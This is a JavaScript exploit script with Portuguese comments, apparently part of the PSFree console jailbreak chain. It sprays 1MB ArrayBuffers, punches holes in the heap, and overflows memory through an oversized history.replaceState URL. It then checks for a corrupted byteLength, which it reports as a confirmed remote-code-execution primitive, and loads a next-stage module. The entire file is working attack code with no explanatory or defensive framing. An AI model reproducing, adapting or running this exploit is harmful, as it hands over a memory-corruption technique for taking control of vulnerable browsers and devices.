/* PSFree Modular: ArrayBuffer 1MB Strategy */

import { log, sleep } from './module/utils.mjs';

const BASE_OFFSET = 709520; 
const OVERFLOW_AMT = 1024 * 64; 

// Tamanho do ArrayBuffer (1MB)
const TARGET_SIZE = 1024 * 1024; 

var victims = [];

async function main() {
    log("=== PSFree: ArrayBuffer Strategy ===");
    log("Alvo: Corromper 'byteLength' de um ArrayBuffer de 1MB.");

    // Tenta offsets próximos, caso o header do ArrayBuffer tenha tamanho diferente
    for (let shift = 0; shift <= 32; shift += 8) {
        log(`\n[TESTE] Recuo de Offset: -${shift} bytes`);
        
        await prepare_heap();
        
        // Tenta disparar com o recuo
        let success = await trigger_exploit(BASE_OFFSET - shift);
        
        if (success) {
            log("!!! RCE PRIMITIVE CONFIRMED !!!", 'green');
            await import('./lapse.mjs');
            return;
        }
        
        victims = [];
        await forceGC();
    }
    
    log("Falha.", 'red');
}

async function prepare_heap() {
    victims = [];
    const SPRAY_COUNT = 80;

    // SPRAY ARRAYBUFFER
    for(let i=0; i<SPRAY_COUNT; i++) {
        // Cria ArrayBuffer de 1MB
        let ab = new ArrayBuffer(TARGET_SIZE);
        // Preenche com padrão reconhecível (opcional, consome CPU)
        // let view = new Uint8Array(ab); view[0] = 0x41; 
        victims.push(ab);
    }

    // BURACOS
    for(let i=0; i<SPRAY_COUNT; i+=2) {
        victims[i] = null;
    }
    await forceGC();
}

async function trigger_exploit(offset) {
    try {
        let buffer = "A".repeat(offset);
        // Overflow direto
        buffer += "\x01".repeat(OVERFLOW_AMT);
        
        history.replaceState({}, "ab_pwn", "/" + buffer);

        return check_victims();

    } catch(e) {
        return false;
    }
}

function check_victims() {
    for(let i=1; i<victims.length; i+=2) {
        let ab = victims[i];
        if(!ab) continue;

        // SE O TAMANHO MUDOU:
        if (ab.byteLength !== TARGET_SIZE) {
            log(`!!! JACKPOT !!! ArrayBuffer ${i} Length: ${ab.byteLength}`, 'green');
            return true;
        }
        
        // Se conseguirmos criar uma view maior que o tamanho original sem erro,
        // pode ser um sinal silencioso (embora byteLength deva refletir a mudança).
    }
    return false;
}

async function forceGC() {
    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 500));
}

main();
